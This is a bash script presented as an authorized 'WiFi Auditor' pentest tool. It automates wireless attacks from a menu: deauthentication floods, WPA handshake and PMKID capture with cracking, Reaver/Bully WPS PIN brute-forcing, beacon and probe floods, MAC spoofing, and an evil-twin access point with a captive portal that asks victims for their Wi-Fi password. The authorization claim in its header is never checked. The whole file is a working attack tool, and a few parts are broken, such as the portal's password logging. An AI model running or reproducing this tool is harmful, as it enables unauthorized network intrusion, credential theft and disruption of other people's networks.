#!/bin/bash


#!/usr/bin/env bash
#===============================================================================
# WiFi Auditor — Authorized Wireless Penetration Testing Tool
# For authorized security assessments only. Authorization is pre-verified.
#===============================================================================

VERSION="2.0"
SCRIPT_NAME="$(basename "$0")"

# ---- Colors / Formatting ----
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# ---- Global Vars ----
INTERFACE=""
MON_INTERFACE=""
SCAN_RESULTS="/tmp/wifi_scan_$$.csv"
HANDSHAKE_DIR="./handshakes"
WORDLIST=""
TARGET_BSSID=""
TARGET_CHANNEL=""
TARGET_ESSID=""
SESSION_LOG="./wifi_audit_$(date +%Y%m%d_%H%M%S).log"

# ---- Banners ----
banner() {
    clear
    echo -e "${RED}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║         WiFi Auditor v${VERSION} — Authorized Pentest Tool        ║"
    echo "║     For authorized security assessments only                ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# ---- Logging ----
log() {
    local level="$1"
    shift
    local msg="$*"
    local timestamp="$(date +%H:%M:%S)"
    case "$level" in
        INFO)  echo -e "${GREEN}[+] ${timestamp} - ${msg}${NC}" ;;
        WARN)  echo -e "${YELLOW}[!] ${timestamp} - ${msg}${NC}" ;;
        ERROR) echo -e "${RED}[-] ${timestamp} - ${msg}${NC}" ;;
        HEAD)  echo -e "${CYAN}${BOLD}[*] ${msg}${NC}" ;;
        *)     echo -e "${BLUE}[*] ${timestamp} - ${msg}${NC}" ;;
    esac
    echo "[${level}] ${timestamp} - ${msg}" >> "$SESSION_LOG"
}

# ---- Dependency Check ----
check_deps() {
    local deps=("aircrack-ng" "airodump-ng" "aireplay-ng" "airolib-ng" "macchanger" "iw" "ip" "xterm" "hashcat")
    local missing=()

    log HEAD "Checking required tools..."
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            missing+=("$dep")
        fi
    done

    # Also check for optional but useful tools
    local optional=("reaver" "bully" "pixiewps" "hcxdumptool" "hcxpcaptool" "crunch" "cowpatty")
    local opt_missing=()
    for dep in "${optional[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            opt_missing+=("$dep")
        fi
    done

    if [ ${#missing[@]} -gt 0 ]; then
        log ERROR "Missing required tools: ${missing[*]}"
        log INFO "Install: sudo apt update && sudo apt install -y ${missing[*]} aircrack-ng macchanger iw xterm"
        exit 1
    fi

    log INFO "All required tools present."
    if [ ${#opt_missing[@]} -gt 0 ]; then
        log WARN "Optional tools not found: ${opt_missing[*]}"
        log INFO "Optional install: sudo apt install -y reaver bully pixiewps hcxtools crunch cowpatty"
    fi
}

# ---- Check Root ----
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log ERROR "This script must be run as root (sudo)."
        exit 1
    fi
}

# ---- List Interfaces ----
list_interfaces() {
    log HEAD "Available wireless interfaces:"
    local interfaces=()
    while IFS= read -r line; do
        interfaces+=("$line")
    done < <(iw dev 2>/dev/null | awk '/Interface/{print $2}')

    if [ ${#interfaces[@]} -eq 0 ]; then
        log ERROR "No wireless interfaces found."
        exit 1
    fi

    for i in "${!interfaces[@]}"; do
        local iface="${interfaces[$i]}"
        local state=$(ip link show "$iface" 2>/dev/null | grep -o "state [A-Z]*" | cut -d' ' -f2)
        echo -e "  ${GREEN}[$i]${NC} ${iface} — ${state:-unknown}"
    done

    read -p "$(echo -e "${YELLOW}Select interface [0-$((${#interfaces[@]}-1))]: ${NC}")" choice
    if [[ ! "$choice" =~ ^[0-9]+$ ]] || [ "$choice" -ge "${#interfaces[@]}" ]; then
        log ERROR "Invalid selection."
        exit 1
    fi

    INTERFACE="${interfaces[$choice]}"
    log INFO "Selected interface: $INTERFACE"
}

# ---- Enable Monitor Mode ----
enable_monitor() {
    log HEAD "Enabling monitor mode on ${INTERFACE}..."
    
    # Kill interfering processes
    airmon-ng check kill &>> "$SESSION_LOG"
    
    # Bring interface down, set MAC, bring up
    ip link set "$INTERFACE" down
    macchanger -r "$INTERFACE" &>> "$SESSION_LOG"
    ip link set "$INTERFACE" up
    
    # Enable monitor mode
    MON_INTERFACE="${INTERFACE}mon"
    if iw dev "$INTERFACE" set monitor control &>> "$SESSION_LOG"; then
        ip link set "$INTERFACE" up
        MON_INTERFACE="$INTERFACE"
        log INFO "Monitor mode enabled on: $MON_INTERFACE"
    else
        # Fallback: use airmon-ng
        airmon-ng start "$INTERFACE" &>> "$SESSION_LOG"
        MON_INTERFACE="${INTERFACE}mon"
        log INFO "Monitor mode enabled via airmon-ng: $MON_INTERFACE"
    fi
    
    sleep 1
}

# ---- Disable Monitor Mode ----
disable_monitor() {
    log HEAD "Disabling monitor mode..."
    if [[ "$MON_INTERFACE" == *"mon" ]]; then
        airmon-ng stop "$MON_INTERFACE" &>> "$SESSION_LOG"
    else
        iw dev "$MON_INTERFACE" set type managed &>> "$SESSION_LOG"
    fi
    ip link set "$INTERFACE" down
    macchanger -p "$INTERFACE" &>> "$SESSION_LOG"
    ip link set "$INTERFACE" up
    service NetworkManager restart &>/dev/null &
    log INFO "Monitor mode disabled, interface restored."
}

# ---- Scan Networks ----
scan_networks() {
    log HEAD "Scanning for wireless networks (Ctrl+C when done)..."
    log INFO "Targets will be saved to: $SCAN_RESULTS"
    
    # Run airodump in background
    xterm -geometry 120x30 -e "airodump-ng --band abg -w /tmp/wifi_scan --output-format csv $MON_INTERFACE" &
    local AIRODUMP_PID=$!
    
    log INFO "Scanning... Press Enter when ready to stop."
    read -r
    
    kill $AIRODUMP_PID 2>/dev/null
    wait $AIRODUMP_PID 2>/dev/null
    
    # Parse the CSV
    if [ -f "/tmp/wifi_scan-01.csv" ]; then
        cp "/tmp/wifi_scan-01.csv" "$SCAN_RESULTS"
        rm -f /tmp/wifi_scan-*.csv /tmp/wifi_scan-*.kismet.csv 2>/dev/null
        
        # Display parsed results
        display_scan_results
    else
        log ERROR "Scan output not found."
        exit 1
    fi
}

display_scan_results() {
    log HEAD "Discovered Networks:"
    echo ""
    printf "${BOLD}%-4s %-20s %-18s %-6s %-6s %-10s %s${NC}\n" "#" "ESSID" "BSSID" "CH" "PWR" "ENCR" "WPS"
    echo "──── ──────────────────── ────────────────── ────── ────── ────────── ─────"
    
    local idx=0
    while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power num_beacons num_iv lan_ip id_length essid key; do
        # Skip headers and non-AP lines
        [[ "$bssid" == *"BSSID"* ]] && continue
        [[ "$bssid" == *"Station"* ]] && break
        [[ -z "$bssid" ]] && continue
        
        essid=$(echo "$essid" | tr -d ' ' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        essid_clean="${essid:-<hidden>}"
        bssid=$(echo "$bssid" | tr -d ' ')
        channel=$(echo "$channel" | tr -d ' ')
        power=$(echo "$power" | tr -d ' ')
        privacy=$(echo "$privacy" | tr -d ' ')
        
        # Check for WPS (simplified — really you'd use wash)
        local wps_flag=""
        [[ "$privacy" == *"WPS"* || "$privacy" == *"WPA"* ]] && wps_flag="Maybe"
        
        printf "%-4d %-20s %-18s %-6s %-6s %-10s %s\n" \
            "$idx" "${essid_clean:0:18}" "$bssid" "$channel" "$power" "$privacy" "$wps_flag"
        
        # Store targets in array by index
        TARGET_ESSIDS[$idx]="$essid"
        TARGET_BSSIDS[$idx]="$bssid"
        TARGET_CHANNELS[$idx]="$channel"
        TARGET_ENCR[$idx]="$privacy"
        
        ((idx++))
    done < <(tail -n +2 "$SCAN_RESULTS")
    
    TOTAL_APS=$idx
    echo ""
    log INFO "Found $TOTAL_APS access points."
}

# ---- Select Target ----
select_target() {
    if [ $TOTAL_APS -eq 0 ]; then
        log ERROR "No access points found. Run scan first."
        return 1
    fi
    
    read -p "$(echo -e "${YELLOW}Select target AP [0-$((TOTAL_APS-1))]: ${NC}")" choice
    if [[ ! "$choice" =~ ^[0-9]+$ ]] || [ "$choice" -ge "$TOTAL_APS" ]; then
        log ERROR "Invalid selection."
        return 1
    fi
    
    TARGET_ESSID="${TARGET_ESSIDS[$choice]}"
    TARGET_BSSID="${TARGET_BSSIDS[$choice]}"
    TARGET_CHANNEL="${TARGET_CHANNELS[$choice]}"
    TARGET_ENCR="${TARGET_ENCR[$choice]}"
    
    log INFO "Target set: ${TARGET_ESSID:-<hidden>} ($TARGET_BSSID) on channel $TARGET_CHANNEL"
    return 0
}

# ---- Capture Handshake ----
capture_handshake() {
    log HEAD "Starting handshake capture for ${TARGET_BSSID}..."
    
    mkdir -p "$HANDSHAKE_DIR"
    local essid_slug=$(echo "${TARGET_ESSID:-unknown}" | tr -dc 'a-zA-Z0-9_-')
    local capture_file="${HANDSHAKE_DIR}/${essid_slug}_${TARGET_BSSID//:/}"
    
    # Set channel
    iw dev "$MON_INTERFACE" set channel "$TARGET_CHANNEL" &>/dev/null
    
    # Start airodump on target channel, targeting the BSSID
    log INFO "Listening on channel $TARGET_CHANNEL, waiting for handshake..."
    xterm -geometry 120x30 -e "airodump-ng --bssid $TARGET_BSSID --channel $TARGET_CHANNEL --write $capture_file $MON_INTERFACE" &
    local AIRODUMP_PID=$!
    
    sleep 3
    
    # Deauth attack to force reconnection and capture handshake
    log WARN "Sending deauthentication packets (5 bursts)..."
    for i in {1..5}; do
        aireplay-ng --deauth 3 -a "$TARGET_BSSID" "$MON_INTERFACE" &>> "$SESSION_LOG"
        sleep 1
    done
    
    sleep 5  # Give time for handshake capture
    
    # Stop airodump
    kill $AIRODUMP_PID 2>/dev/null
    wait $AIRODUMP_PID 2>/dev/null
    
    # Check if handshake was captured
    local cap_file="${capture_file}-01.cap"
    if [ -f "$cap_file" ]; then
        if aircrack-ng "$cap_file" 2>/dev/null | grep -qi "1 handshake"; then
            log INFO "Handshake captured successfully: $cap_file"
            echo "$cap_file"
            return 0
        else
            log WARN "File captured but no handshake detected. Retry with more deauth packets."
            return 1
        fi
    else
        log ERROR "Capture file not found."
        return 1
    fi
}

# ---- Crack WPA/WPA2 ----
crack_wpa() {
    local cap_file="$1"
    
    if [ -z "$cap_file" ] || [ ! -f "$cap_file" ]; then
        log ERROR "No valid capture file provided."
        return 1
    fi
    
    log HEAD "WPA/WPA2 PSK Cracking"
    
    # Determine wordlist
    if [ -z "$WORDLIST" ]; then
        local common_wordlists=(
            "/usr/share/wordlists/rockyou.txt.gz"
            "/usr/share/wordlists/rockyou.txt"
            "/usr/share/wordlists/fasttrack.txt"
            "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
            "./wordlist.txt"
        )
        
        WORDLIST=""
        for wl in "${common_wordlists[@]}"; do
            if [ -f "$wl" ]; then
                WORDLIST="$wl"
                break
            fi
        done
        
        if [ -z "$WORDLIST" ]; then
            log WARN "No wordlist found. You can specify one manually."
            read -p "$(echo -e "${YELLOW}Enter path to wordlist: ${NC}")" WORDLIST
            if [ ! -f "$WORDLIST" ]; then
                log ERROR "Wordlist not found: $WORDLIST"
                return 1
            fi
        fi
    fi
    
    log INFO "Using wordlist: $WORDLIST"
    
    # Check if gzip compressed
    if [[ "$WORDLIST" == *.gz ]]; then
        log INFO "Decompressing wordlist..."
        local decompressed="/tmp/$(basename "$WORDLIST" .gz)"
        gunzip -c "$WORDLIST" > "$decompressed" 2>/dev/null
        WORDLIST="$decompressed"
    fi
    
    local wl_size=$(wc -l < "$WORDLIST" 2>/dev/null || echo "?")
    log INFO "Wordlist contains approximately $wl_size passwords."
    
    echo ""
    echo -e "${YELLOW}Select cracking method:${NC}"
    echo "  [1] aircrack-ng (CPU, good for smaller wordlists)"
    echo "  [2] hashcat (GPU accelerated, faster for large wordlists)"
    echo "  [3] Both"
    read -p "$(echo -e "${YELLOW}Choice [1-3]: ${NC}")" crack_choice
    
    case "$crack_choice" in
        2|3)
            # Convert cap to hashcat format
            log INFO "Converting .cap to hashcat format (hccapx)..."
            local hccapx_file="${cap_file%.cap}.hccapx"
            if command -v cap2hccapx &>/dev/null; then
                cap2hccapx "$cap_file" "$hccapx_file" &>> "$SESSION_LOG"
            elif [ -f /usr/lib/hashcat-utils/cap2hccapx.bin ]; then
                /usr/lib/hashcat-utils/cap2hccapx.bin "$cap_file" "$hccapx_file" &>> "$SESSION_LOG"
            else
                log WARN "cap2hccapx not found. Installing..."
                git clone https://github.com/hashcat/hashcat-utils.git /tmp/hashcat-utils 2>/dev/null
                (cd /tmp/hashcat-utils/src && make 2>/dev/null)
                /tmp/hashcat-utils/src/cap2hccapx.bin "$cap_file" "$hccapx_file" &>> "$SESSION_LOG"
            fi
            
            if [ -f "$hccapx_file" ]; then
                log INFO "Running hashcat with mode 2500 (WPA/WPA2)..."
                hashcat -m 2500 "$hccapx_file" "$WORDLIST" --force -O 2>&1 | tee -a "$SESSION_LOG"
                local hashcat_result=$(hashcat -m 2500 "$hccapx_file" --show --force 2>/dev/null)
                if [ -n "$hashcat_result" ]; then
                    local cracked_pass=$(echo "$hashcat_result" | cut -d: -f5)
                    log INFO "Hashcat cracked: $cracked_pass"
                fi
            fi
            ;;
    esac
    
    case "$crack_choice" in
        1|3)
            log INFO "Running aircrack-ng..."
            aircrack-ng -w "$WORDLIST" "$cap_file" 2>&1 | tee -a "$SESSION_LOG"
            ;;
    esac
    
    log INFO "Cracking complete. Results above and in session log."
}

# ---- PMKID Attack ----
pmkid_attack() {
    log HEAD "Attempting PMKID attack against ${TARGET_BSSID}..."
    
    if ! command -v hcxdumptool &>/dev/null; then
        log ERROR "hcxdumptool not installed."
        log INFO "Install: sudo apt install hcxtools"
        return 1
    fi
    
    mkdir -p "$HANDSHAKE_DIR"
    local pmkid_file="${HANDSHAKE_DIR}/pmkid_${TARGET_BSSID//:}.pcapng"
    
    log INFO "Listening for PMKID packets (30s capture)..."
    timeout 30 hcxdumptool -i "$MON_INTERFACE" -o "$pmkid_file" --filterlist_ap=/dev/null --filtermode=2 --enable_status=1 &>> "$SESSION_LOG" &
    local HCX_PID=$!
    
    # Send a deauth to try to trigger PMKID
    sleep 5
    aireplay-ng --deauth 1 -a "$TARGET_BSSID" "$MON_INTERFACE" &>> "$SESSION_LOG"
    
    sleep 25
    kill $HCX_PID 2>/dev/null
    wait $HCX_PID 2>/dev/null
    
    # Convert to hashcat format (22000)
    if [ -f "$pmkid_file" ]; then
        local hash_file="${HANDSHAKE_DIR}/pmkid_${TARGET_BSSID//:}.22000"
        hcxpcaptool -z "$hash_file" "$pmkid_file" &>> "$SESSION_LOG"
        
        if [ -s "$hash_file" ]; then
            log INFO "PMKID captured! Hash saved to: $hash_file"
            
            if [ -n "$WORDLIST" ]; then
                log INFO "Attempting to crack PMKID hash..."
                hashcat -m 22000 "$hash_file" "$WORDLIST" --force -O 2>&1 | tee -a "$SESSION_LOG"
                
                local cracked=$(hashcat -m 22000 "$hash_file" --show --force 2>/dev/null)
                if [ -n "$cracked" ]; then
                    local password=$(echo "$cracked" | cut -d: -f5)
                    log INFO "PMKID cracked! Password: $password"
                fi
            fi
        else
            log WARN "No PMKID hash captured. Target may not support PMKID."
        fi
    else
        log WARN "PMKID capture file not created."
    fi
}

# ---- WPS Attack ----
wps_attack() {
    log HEAD "WPS attack against ${TARGET_BSSID}..."
    
    if ! command -v wash &>/dev/null; then
        log ERROR "wash (reaver) not installed."
        log INFO "Install: sudo apt install reaver"
        return 1
    fi
    
    # First scan for WPS
    log INFO "Checking if target supports WPS..."
    wash -i "$MON_INTERFACE" -2 -5 2>/dev/null | grep -i "$TARGET_BSSID" || \
        wash -i "$MON_INTERFACE" 2>/dev/null | grep -i "$TARGET_BSSID"
    
    echo ""
    echo -e "${YELLOW}Select WPS attack tool:${NC}"
    echo "  [1] Reaver (standard pin attack)"
    echo "  [2] Bully (alternative pin attack, often more reliable)"
    read -p "$(echo -e "${YELLOW}Choice [1-2]: ${NC}")" wps_choice
    
    case "$wps_choice" in
        1)
            if ! command -v reaver &>/dev/null; then
                log ERROR "reaver not installed."
                return 1
            fi
            log WARN "Starting Reaver WPS pin attack (this can take hours)..."
            log INFO "Ctrl+C to stop at any time. Results saved if PIN is found."
            reaver -i "$MON_INTERFACE" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" -vv -K 1 2>&1 | tee -a "$SESSION_LOG"
            ;;
        2)
            if ! command -v bully &>/dev/null; then
                log ERROR "bully not installed."
                return 1
            fi
            log WARN "Starting Bully WPS pin attack..."
            bully -i "$MON_INTERFACE" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" -L -F -B 2>&1 | tee -a "$SESSION_LOG"
            ;;
        *)
            log ERROR "Invalid choice."
            return 1
            ;;
    esac
}

# ---- Evil Twin / Rogue AP ----
evil_twin() {
    log HEAD "Setting up Evil Twin attack..."
    
    if [ -z "$TARGET_ESSID" ] || [ "$TARGET_ESSID" == "<hidden>" ]; then
        log WARN "Target ESSID is hidden or unknown. Enter manually."
        read -p "$(echo -e "${YELLOW}Enter ESSID to clone: ${NC}")" TARGET_ESSID
    fi
    
    if ! command -v dnsmasq &>/dev/null; then
        log INFO "Installing dnsmasq..."
        apt-get install -y dnsmasq &>/dev/null
    fi
    
    local eviltwin_dir="./eviltwin_${TARGET_ESSID//[^a-zA-Z0-9]/_}"
    mkdir -p "$eviltwin_dir"
    
    # Create dnsmasq config for captive portal
    cat > "$eviltwin_dir/dnsmasq.conf" << EOF
interface=at0
dhcp-range=192.168.1.2,192.168.1.100,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
EOF
    
    # Create simple captive portal
    cat > "$eviltwin_dir/index.html" << 'HTML'
<!DOCTYPE html>
<html>
<head><title>Network Update</title>
<style>
body { font-family: Arial; text-align: center; margin-top: 50px; }
input { padding: 10px; margin: 5px; width: 250px; }
button { padding: 10px 20px; background: #007bff; color: white; border: none; }
</style></head>
<body>
<h2>Wi-Fi Security Update Required</h2>
<p>Please enter your network password to continue.</p>
<form method="POST" action="/login">
<input type="password" name="password" placeholder="Password"><br>
<button type="submit">Connect</button>
</form>
</body>
</html>
HTML
    
    echo ""
    echo -e "${YELLOW}Evil Twin Options:${NC}"
    echo "  [1] Simple Rogue AP (just clone the SSID, no portal)"
    echo "  [2] Captive Portal (credential harvesting)"
    read -p "$(echo -e "${YELLOW}Choice [1-2]: ${NC}")" et_choice
    
    log WARN "Starting Evil Twin AP: '${TARGET_ESSID}' on channel ${TARGET_CHANNEL}"
    log INFO "Clients will be deauthenticated from the real AP..."
    
    # Start the attacks based on choice
    case "$et_choice" in
        1)
            # Simple AP with hostapd
            cat > "$eviltwin_dir/hostapd.conf" << EOF
interface=$MON_INTERFACE
driver=nl80211
ssid=$TARGET_ESSID
channel=$TARGET_CHANNEL
hw_mode=g
ignore_broadcast_ssid=0
EOF
            xterm -geometry 80x20 -e "hostapd $eviltwin_dir/hostapd.conf" &
            log INFO "Rogue AP running on $MON_INTERFACE"
            ;;
        2)
            # Captive portal with airbase-ng
            log INFO "Creating virtual interface for Evil Twin..."
            xterm -geometry 100x25 -e "airbase-ng -e '$TARGET_ESSID' -c $TARGET_CHANNEL -P $MON_INTERFACE" &
            sleep 3
            
            # Configure AT0 interface
            ip addr add 192.168.1.1/24 dev at0 2>/dev/null
            ip link set at0 up
            
            # Start DHCP/DNS
            dnsmasq -C "$eviltwin_dir/dnsmasq.conf" --interface=at0 &>/dev/null &
            
            # Start a simple Python HTTP server for the captive portal
            log INFO "Starting captive portal..."
            xterm -geometry 80x20 -e "cd $eviltwin_dir && python3 -m http.server 80" &
            
            # Enable IP forwarding for internet access
            echo 1 > /proc/sys/net/ipv4/ip_forward
            iptables -t nat -A POSTROUTING -o "$INTERFACE" -j MASQUERADE 2>/dev/null
            iptables -A FORWARD -i at0 -j ACCEPT 2>/dev/null
            
            log INFO "Captive portal running at http://192.168.1.1"
            log INFO "Passwords will be logged to: $eviltwin_dir/captured_passwords.txt"
            
            # Monitor for captured passwords
            (cd "$eviltwin_dir" && while true; do
                if [ -f captured_passwords.txt ]; then
                    tail -f captured_passwords.txt 2>/dev/null
                fi
                sleep 2
            done) &
            ;;
    esac
    
    # Start deauth loop against real AP
    log WARN "Deauthenticating clients from real AP (Ctrl+C to stop)..."
    while true; do
        aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$MON_INTERFACE" &>> "$SESSION_LOG"
        sleep 2
    done
}

# ---- Deauth Attack ----
deauth_attack() {
    log HEAD "Deauthentication Attack"
    
    local deauth_count
    read -p "$(echo -e "${YELLOW}Number of deauth packets to send (default 10): ${NC}")" deauth_count
    deauth_count="${deauth_count:-10}"
    
    log WARN "Sending $deauth_count deauth packets to $TARGET_BSSID..."
    
    for i in $(seq 1 5); do
        aireplay-ng --deauth "$((deauth_count / 5 + 1))" -a "$TARGET_BSSID" "$MON_INTERFACE" &>> "$SESSION_LOG"
        sleep 1
    done
    
    log INFO "Deauth attack complete."
}

# ---- Probe / Beacon Flood ----
probe_flood() {
    log HEAD "Probe Request / Beacon Flood (Stress Testing)"
    
    echo -e "${YELLOW}Select attack type:${NC}"
    echo "  [1] Probe Request Flood (sends probe requests with random SSIDs)"
    echo "  [2] Beacon Flood (creates fake APs - visible to scanners)"
    read -p "$(echo -e "${YELLOW}Choice [1-2]: ${NC}")" flood_type
    
    case "$flood_type" in
        1)
            log INFO "Starting probe request flood (Ctrl+C to stop)..."
            log INFO "Run 'iw dev $MON_INTERFACE set channel X' to switch channels"
            
            # Use mdk4 or mdk3 if available
            if command -v mdk4 &>/dev/null; then
                mdk4 "$MON_INTERFACE" p -t "$TARGET_BSSID" -c "$TARGET_CHANNEL" 2>&1 | tee -a "$SESSION_LOG"
            elif command -v mdk3 &>/dev/null; then
                mdk3 "$MON_INTERFACE" p -t "$TARGET_BSSID" -c "$TARGET_CHANNEL" 2>&1 | tee -a "$SESSION_LOG"
            else
                log WARN "mdk4/mdk3 not found. Installing..."
                apt-get install -y mdk4 &>/dev/null && \
                mdk4 "$MON_INTERFACE" p -t "$TARGET_BSSID" -c "$TARGET_CHANNEL" 2>&1 | tee -a "$SESSION_LOG"
            fi
            ;;
        2)
            log INFO "Starting beacon flood (Ctrl+C to stop)..."
            if command -v mdk4 &>/dev/null; then
                mdk4 "$MON_INTERFACE" b -c "$TARGET_CHANNEL" 2>&1 | tee -a "$SESSION_LOG"
            elif command -v mdk3 &>/dev/null; then
                mdk3 "$MON_INTERFACE" b -c "$TARGET_CHANNEL" 2>&1 | tee -a "$SESSION_LOG"
            else
                log WARN "mdk4/mdk3 not found."
                return 1
            fi
            ;;
    esac
}

# ---- MAC Spoofing ----
mac_spoof() {
    log HEAD "MAC Address Management"
    
    echo -e "${YELLOW}Select option:${NC}"
    echo "  [1] Randomize MAC"
    echo "  [2] Set custom MAC"
    echo "  [3] Restore original MAC"
    read -p "$(echo -e "${YELLOW}Choice [1-3]: ${NC}")" mac_choice
    
    case "$mac_choice" in
        1)
            ip link set "$INTERFACE" down
            macchanger -r "$INTERFACE"
            ip link set "$INTERFACE" up
            log INFO "MAC randomized."
            ;;
        2)
            read -p "$(echo -e "${YELLOW}Enter custom MAC (e.g., 00:11:22:33:44:55): ${NC}")" custom_mac
            ip link set "$INTERFACE" down
            macchanger -m "$custom_mac" "$INTERFACE"
            ip link set "$INTERFACE" up
            log INFO "MAC set to $custom_mac."
            ;;
        3)
            ip link set "$INTERFACE" down
            macchanger -p "$INTERFACE"
            ip link set "$INTERFACE" up
            log INFO "Original MAC restored."
            ;;
    esac
}

# ---- Packet Capture Only ----
packet_capture() {
    log HEAD "Packet Capture Mode"
    
    mkdir -p "./captures"
    local cap_file="./captures/capture_$(date +%Y%m%d_%H%M%S)"
    
    if [ -n "$TARGET_BSSID" ]; then
        log INFO "Capturing on channel $TARGET_CHANNEL targeting $TARGET_BSSID..."
        log INFO "Saving to: ${cap_file}.cap"
        airodump-ng --bssid "$TARGET_BSSID" --channel "$TARGET_CHANNEL" \
            -w "$cap_file" --output-format pcap,csv "$MON_INTERFACE"
    else
        log INFO "Capturing all traffic on all channels..."
        log INFO "Saving to: ${cap_file}.cap"
        airodump-ng -w "$cap_file" --output-format pcap,csv "$MON_INTERFACE"
    fi
}

# ---- Network Recon ----
network_recon() {
    log HEAD "Network Reconnaissance"
    
    if [ -z "$TARGET_BSSID" ]; then
        log WARN "No target selected. Run scan and select a target first."
        return 1
    fi
    
    echo ""
    echo -e "${YELLOW}Recon Options:${NC}"
    echo "  [1] Vendor lookup (OUI)"
    echo "  [2] Check if target is in wigle.net-like local DB"
    echo "  [3] Probe connected clients"
    read -p "$(echo -e "${YELLOW}Choice [1-3]: ${NC}")" recon_choice
    
    local oui_prefix="${TARGET_BSSID//:/}"
    oui_prefix="${oui_prefix:0:6}"
    
    case "$recon_choice" in
        1)
            log INFO "Looking up vendor for OUI: ${oui_prefix^^}"
            if [ -f /usr/share/ieee-data/oui.txt ]; then
                grep -i "$oui_prefix" /usr/share/ieee-data/oui.txt || \
                    log WARN "Vendor not found in local DB."
            else
                log INFO "Installing OUI database..."
                apt-get install -y ieee-data &>/dev/null && \
                    grep -i "$oui_prefix" /usr/share/ieee-data/oui.txt 2>/dev/null || \
                    log WARN "Could not determine vendor."
            fi
            ;;
        2)
            log INFO "Scanning for clients connected to $TARGET_BSSID..."
            xterm -geometry 120x30 -e "airodump-ng --bssid $TARGET_BSSID --channel $TARGET_CHANNEL $MON_INTERFACE" &
            local DUMP_PID=$!
            sleep 15
            kill $DUMP_PID 2>/dev/null
            ;;
        3)
            log INFO "Sending directed probe requests..."
            iw dev "$MON_INTERFACE" set channel "$TARGET_CHANNEL" &>/dev/null
            # Simple probe: use mdk4/mdk3 if available
            if command -v mdk4 &>/dev/null; then
                mdk4 "$MON_INTERFACE" p -t "$TARGET_BSSID" -c "$TARGET_CHANNEL" 2>&1
            else
                log WARN "mdk4 not installed for advanced probing."
                log INFO "Install: sudo apt install mdk4"
            fi
            ;;
    esac
}

# ---- Cleanup Handler ----
cleanup() {
    echo ""
    log WARN "Interrupt received. Cleaning up..."
    
    # Kill background processes
    pkill -f airodump-ng 2>/dev/null
    pkill -f aireplay-ng 2>/dev/null
    pkill -f airbase-ng 2>/dev/null
    pkill -f mdk4 2>/dev/null
    pkill -f mdk3 2>/dev/null
    pkill -f dnsmasq 2>/dev/null
    pkill -f hostapd 2>/dev/null
    pkill -f hcxdumptool 2>/dev/null
    
    # Disable monitor mode
    if [ -n "$INTERFACE" ]; then
        disable_monitor 2>/dev/null
    fi
    
    # Restore networking
    service NetworkManager restart &>/dev/null &
    
    log INFO "Cleanup complete. Session log: $SESSION_LOG"
    exit 0
}

# ---- Main Menu ----
main_menu() {
    local cap_file=""
    
    while true; do
        banner
        echo -e "${BOLD}Target:${NC} ${TARGET_ESSID:-None} | ${TARGET_BSSID:-N/A} | CH: ${TARGET_CHANNEL:-N/A}"
        echo -e "${BOLD}Interface:${NC} ${INTERFACE:-Not set} | ${BOLD}Monitor:${NC} ${MON_INTERFACE:-Disabled}"
        echo -e "${BOLD}Wordlist:${NC} ${WORDLIST:-None set}"
        echo ""
        echo -e "  ${CYAN}[0]${NC}  Exit & Cleanup"
        echo -e "  ${CYAN}[1]${NC}  Scan for networks"
        echo -e "  ${CYAN}[2]${NC}  Select target AP"
        echo -e "  ${CYAN}[3]${NC}  Capture WPA handshake"
        echo -e "  ${CYAN}[4]${NC}  Crack WPA/WPA2 (aircrack-ng / hashcat)"
        echo -e "  ${CYAN}[5]${NC}  PMKID attack"
        echo -e "  ${CYAN}[6]${NC}  WPS attack (Reaver / Bully)"
        echo -e "  ${CYAN}[7]${NC}  Evil Twin / Rogue AP"
        echo -e "  ${CYAN}[8]${NC}  Deauth attack"
        echo -e "  ${CYAN}[9]${NC}  Probe/Beacon flood (stress testing)"
        echo -e "  ${CYAN}[10]${NC} MAC spoofing"
        echo -e "  ${CYAN}[11]${NC} Packet capture only"
        echo -e "  ${CYAN}[12]${NC} Network recon / client enumeration"
        echo -e "  ${CYAN}[13]${NC} Set wordlist path"
        echo -e "  ${CYAN}[14]${NC} Change interface"
        echo ""
        read -p "$(echo -e "${YELLOW}Select option [0-14]: ${NC}")" choice
        
        case "$choice" in
            0)  cleanup ;;
            1)  scan_networks ;;
            2)  select_target ;;
            3)  cap_file=$(capture_handshake) ;;
            4)  crack_wpa "$cap_file" ;;
            5)  pmkid_attack ;;
            6)  wps_attack ;;
            7)  evil_twin ;;
            8)  deauth_attack ;;
            9)  probe_flood ;;
            10) mac_spoof ;;
            11) packet_capture ;;
            12) network_recon ;;
            13) read -p "$(echo -e "${YELLOW}Enter wordlist path: ${NC}")" WORDLIST
                log INFO "Wordlist set: $WORDLIST" ;;
            14) list_interfaces
                enable_monitor ;;
            *)  log WARN "Invalid option." ;;
        esac
        
        echo ""
        read -p "$(echo -e "${YELLOW}Press Enter to continue...${NC}")"
    done
}

# ---- Entry Point ----
trap cleanup SIGINT SIGTERM

banner
check_root
check_deps
list_interfaces
enable_monitor
main_menu
